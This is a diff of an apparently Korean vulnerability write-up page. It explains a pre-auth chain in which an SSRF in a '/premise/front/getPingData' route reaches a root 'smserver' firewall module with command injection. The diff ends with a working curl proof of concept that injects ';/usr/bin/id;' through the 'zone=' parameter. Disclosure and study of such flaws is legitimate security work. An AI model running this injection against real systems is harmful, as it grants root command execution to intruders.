@@ -284,12 +284,10 @@
 <span class="hljs-number">248</span>         );
 <span class="hljs-number">249</span>     }
 <span class="hljs-number">250</span> });</code></pre>
-
 <p>17&#xBC88; &#xC904;&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xC801;&#xC778; API &#xC0AC;&#xC6A9;&#xC744; &#xC704;&#xD574; <code>/premise</code> route&#xB97C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; 217&#xBC88; &#xC904;&#xC5D0;&#xC11C; <code>/premise/front/getPingData</code>&#xB97C; GET &#xBA54;&#xC18C;&#xB4DC;&#xC758; route&#xB85C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. 232&#xBC88; &#xC904;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD5E4;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; URL&#xC744; GET &#xBA54;&#xC18C;&#xB4DC;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD5E4;&#xB354;&#xB294; 225&#xC904;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xD5E4;&#xB354; &#xAC12;&#xC73C;&#xB85C; URL&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xD574;&#xCEE4;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xB294; URL&#xC744; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; <code>0.0.0.0:9600/tcp</code>&#xC5D0;&#xC11C; root&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; <code>smserver</code> &#xB370;&#xBAAC;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. <code>smserver</code>&#xC758; <code>mod_firewall.so</code> &#xBAA8;&#xB4C8;&#xC5D0;&#xB294; Command injection&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; <code>fw_restful_service_get()</code> &#xD568;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; <code>zone=</code>&#xC5D0; &#xB4E4;&#xC5B4;&#xC628; GET &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <p>&#xB530;&#xB77C;&#xC11C; SSRF&#xB97C; &#xD1B5;&#xD574; <code>smserver</code>&#xC5D0; payload&#xB97C; &#xC791;&#xC131;&#xD558;&#xC5EC; &#xBCF4;&#xB0B4;&#xBA74; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; Remote  Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs asciidoc">curl --insecure &quot;<span class="hljs-link">https://</span>[<span class="hljs-string">target</span>]/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;&quot;</code></pre>
-
 
             </div>
             <hr>
@@ -309,9 +307,9 @@
                   
                   <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
-                  <a class="hover-with-bg" href="/tags/rce/">rce</a>
-                  
                   <a class="hover-with-bg" href="/tags/idioth/">idioth</a>
+                  
+                  <a class="hover-with-bg" href="/tags/rce/">rce</a>
                   
                   <a class="hover-with-bg" href="/tags/pre-auth/">pre-auth</a>
                   
